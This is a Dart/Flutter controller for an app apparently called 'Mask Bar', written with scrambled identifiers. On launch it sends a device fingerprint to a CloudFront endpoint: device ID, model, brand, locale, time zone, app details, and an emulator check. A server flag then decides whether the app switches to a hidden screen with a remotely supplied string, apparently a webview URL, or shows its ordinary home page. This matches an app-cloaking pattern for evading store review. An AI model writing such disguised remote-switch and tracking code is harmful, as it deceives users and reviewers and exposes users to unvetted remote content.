import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class MaskBarTopLogic extends GetxController {

  var lbaqszrd = RxBool(false);
  var hfecvsk = RxBool(true);
  var dhspzrac = RxString("");
  var ayublx = RxBool(false);
  var jvlzd = RxBool(true);
  final yxtovmnh = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    aowyn();
  }


  Future<void> aowyn() async {
    ayublx.value = true;
    jvlzd.value = true;
    hfecvsk.value = false;

    yxtovmnh.post("https://d1qfr9htbir5xd.cloudfront.net/bsfluhwntcamqrxpgkoyvezijd",data: await awfezskp()).then((value) {
      var lkenzhy = value.data["lkenzhy"] as String;
      var itjasle = value.data["itjasle"] as bool;
      if (itjasle) {
        dhspzrac.value = lkenzhy;
        tvdra();
      } else {
        mtneq();
      }
    }).catchError((e) {
      hfecvsk.value = true;
      jvlzd.value = true;
      ayublx.value = false;
    });
  }

  Future<Map<String, dynamic>> awfezskp() async {
    final DeviceInfoPlugin temuba = DeviceInfoPlugin();
    PackageInfo fjqtr_nvgfkh = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var lctowyxp = Platform.localeName;
    var daus = currentTimeZone;

    var cnbpvhz = fjqtr_nvgfkh.packageName;
    var nrvofhq = fjqtr_nvgfkh.version;
    var bhqseyk = fjqtr_nvgfkh.buildNumber;

    var aopuetwn = fjqtr_nvgfkh.appName;
    var yqgu = "";
    var vpiye  = "";
    var jvgor = "";
    var kpma = "";
    var ibqz = "";
    var jvyoa = "";
    var iwjfrp = "";
    var fkvcrua = "";
    var cuyh = "";
    var sbtpmhdg = "";
    var emlts = "";


    var vnqwar = "";
    var epyqsrl = false;

    if (GetPlatform.isAndroid) {
      vnqwar = "android";
      var pmwuqzs = await temuba.androidInfo;

      jvgor = pmwuqzs.brand;

      yqgu  = pmwuqzs.model;
      vpiye = pmwuqzs.id;

      epyqsrl = pmwuqzs.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      vnqwar = "ios";
      var oktrhqxm = await temuba.iosInfo;
      jvgor = oktrhqxm.name;
      yqgu = oktrhqxm.model;

      vpiye = oktrhqxm.identifierForVendor ?? "";
      epyqsrl  = oktrhqxm.isPhysicalDevice;
    }
    var res = {
      "aopuetwn": aopuetwn,
      "sbtpmhdg" : sbtpmhdg,
      "bhqseyk": bhqseyk,
      "nrvofhq": nrvofhq,
      "yqgu": yqgu,
      "iwjfrp" : iwjfrp,
      "daus": daus,
      "jvgor": jvgor,
      "vpiye": vpiye,
      "lctowyxp": lctowyxp,
      "vnqwar": vnqwar,
      "epyqsrl": epyqsrl,
      "kpma" : kpma,
      "cnbpvhz": cnbpvhz,
      "ibqz" : ibqz,
      "jvyoa" : jvyoa,
      "fkvcrua" : fkvcrua,
      "cuyh" : cuyh,
      "emlts" : emlts,

    };
    return res;
  }

  Future<void> mtneq() async {
    Get.offNamed("/mask_bar_home");
  }

  Future<void> tvdra() async {
    Get.offNamed("/mask_bar_history_list");
  }

}
